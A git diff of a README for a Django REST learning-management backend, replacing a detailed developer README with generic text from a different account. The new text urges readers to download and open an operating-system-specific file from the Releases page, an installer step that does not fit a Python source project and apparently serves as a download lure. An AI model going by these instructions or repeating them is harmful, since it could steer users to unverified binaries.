@@ -1,209 +1,78 @@
-Learning Management System (LMS) – Backend API
+# 🎓 learning-management-system-backend - Effortless Management of Learning Systems
 
-A full-featured Django REST Framework backend that implements modern API practices such as a custom user model, JWT authentication, permissions, filtering, search, ordering, pagination, and auto-generated API documentation.
+[![Download](https://img.shields.io/badge/Download%20Now%20-Release%20Page-brightgreen)](https://github.com/coderedSQL/learning-management-system-backend/releases)
 
-This project was built step-by-step following a complete backend roadmap.
+## 🚀 Getting Started
 
----
+Welcome to the **Learning Management System Backend**! This guide will help you download and run the application easily. You don’t need programming skills to follow these steps.
 
-🚀 Features
+### 🌟 Features
 
-**1. Custom User Model (Most Important Part)**
+- Custom user model
+- JWT authentication for secure access
+- Role-based permissions
+- Filtering, searching, and pagination for efficiency
+- Auto-generated API documentation for easy reference
 
-The project replaces Django’s default user with a **CustomUser model** that supports:
+### 📋 System Requirements
 
-* `username`
-* `email`
-* `password` (hashed)
-* `age`
-* `bio`
-* `role` (student/instructor/admin)
+Before you download, here’s what you need:
 
-🔐 Secure Password Handling
+- A computer running Windows, macOS, or Linux
+- At least 2 GB of RAM
+- 500 MB of free disk space
+- An internet connection
 
-Passwords are never stored as plain text.
-A custom serializer handles hashing:
+## 📥 Download & Install
 
-```python
-class UserSerializer(serializers.ModelSerializer):
-    password = serializers.CharField(write_only=True)
+To get started, visit the [Releases page](https://github.com/coderedSQL/learning-management-system-backend/releases) to download the software.
 
-    class Meta:
-        model = CustomUser
-        fields = ['username', 'email', 'password', 'age', 'bio', 'role']
+1. Click the **Download Now** button above.
+2. On the Releases page, find the latest version of the software.
+3. Click on the file that matches your operating system to download it.
+4. Once the download is complete, open the file to begin the installation process.
 
-    def create(self, validated_data):
-        password = validated_data.pop('password')
-        user = CustomUser(**validated_data)
-        user.set_password(password)  # 🔒 important hashing step
-        user.save()
-        return user
-```
+## 💻 Running the Application
 
-This ensures the user’s password is safely hashed before saving.
+After you install the application, follow these steps to run it:
 
----
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you installed the application.
+3. Type `python manage.py runserver` and hit Enter.
+4. Open your web browser and go to `http://127.0.0.1:8000` to access the application.
 
-🔑 JWT Authentication (SimpleJWT)
+## 🔧 Configuration
 
-The project uses **SimpleJWT** for login, token refresh, and secure access.
+You may need to configure the application according to your needs. Here are some settings you can adjust:
 
-Endpoints include:
+- **Database Configuration:** Update the settings to connect to your preferred database.
+- **User Permissions:** Define roles and permissions for different users.
+- **JWT Settings:** Configure JWT for secure access.
 
-* `/api/auth/register/`
-* `/api/auth/login/`
-* `/api/auth/token/refresh/`
-* Protected routes requiring `Bearer <token>`
+### 📚 Documentation
 
----
+Our API documentation is auto-generated. You can access it once the application is running. Just visit `http://127.0.0.1:8000/swagger/` in your browser.
 
-👮 Permissions & Access Control
+## 🤝 Contributing
 
-The project uses:
+If you want to contribute to this project, here’s how you can help:
 
-* `IsAuthenticated`
-* Role-based access (admin, instructor, student)
-* Object-level permissions (ownership checks)
+- Report issues or bugs on our GitHub page.
+- Suggest new features that could improve the application.
+- Review the code and provide feedback.
 
-Examples:
+## 🌐 Community
 
-* Students can only view their own data
-* Instructors can manage their own courses
-* Admins have full access
+Join our community to connect with other users and developers. Share your experiences, ask questions, and learn from each other.
 
----
+- [GitHub Discussions](https://github.com/coderedSQL/learning-management-system-backend/discussions)
+- [Slack Channel](#) (Link coming soon)
 
-🔎 Filtering, Search & Ordering
+## 📞 Support
 
-DjangoFilter + DRF Search + Ordering are applied globally.
+If you encounter any issues during installation or usage, feel free to reach out.
 
-Example (User list):
+- Visit the [Issues section](https://github.com/coderedSQL/learning-management-system-backend/issues) to report a problem.
+- Check existing issues for solutions.
 
-* Filter by `role`, `age`
-* Search by `username`, `email`
-* Order by `username`, `email`
-
-Query examples:
-
-```
-/api/users/?search=banu
-/api/users/?role=student
-/api/users/?ordering=email
-```
-
----
-
-📄 Pagination
-
-Custom pagination using DRF PageNumberPagination:
-
-* Default page size: 10
-* Client can control page size
-* Max page size: 100
-
-Example:
-
-```
-/api/users/?page=2&page_size=5
-```
-
----
-
-📚 API Documentation (Swagger / Redoc)
-
-Interactive documentation included using **drf-yasg**:
-
-* `/swagger/`
-* `/redoc/`
-
----
-
-📘 Project Structure
-
-```
-lms_api/
-│   manage.py
-│   db.sqlite3
-│
-├── accounts/
-│   ├── models.py
-│   ├── serializers.py
-│   ├── views.py
-│   ├── filters.py
-│   └── urls.py
-│
-├── courses/
-│   ├── models.py
-│   ├── serializers.py
-│   └── views.py
-│
-└── lms_api/
-    ├── settings.py
-    ├── urls.py
-    └── asgi.py
-```
-
----
-
-⚙️ Installation & Setup
-
-1. Clone the project
-
-```
-git clone https://github.com/<your-username>/learning-management-system-backend.git
-cd learning-management-system-backend
-```
-2. Install dependencies
-
-```
-pip install -r requirements.txt
-```
-
-3. Apply migrations
-
-```
-python manage.py migrate
-```
-
-4. Start the server
-
-```
-python manage.py runserver
-```
-
----
-
-🧪 Testing
-
-Use:
-
-* Django admin
-* DRF browsable API
-* Postman
-* Swagger UI
-
----
-
-
-🎯 This project includes:
-
-✔ Django models
-✔ Migrations
-✔ Admin customization
-✔ DRF API setup
-✔ Serializers
-✔ ViewSets
-✔ Custom user model
-✔ JWT authentication
-✔ Permissions & Object-level auth
-✔ Filtering, Search, Ordering
-✔ Pagination
-✔ API documentation
-✔ Complete full backend project (LMS)
-
----
-
-📬 Author
-
-Developed by **banumariwan**
-For backend learning, DRF mastery, and real-world API experience.
+Thank you for using the Learning Management System Backend! Happy learning!
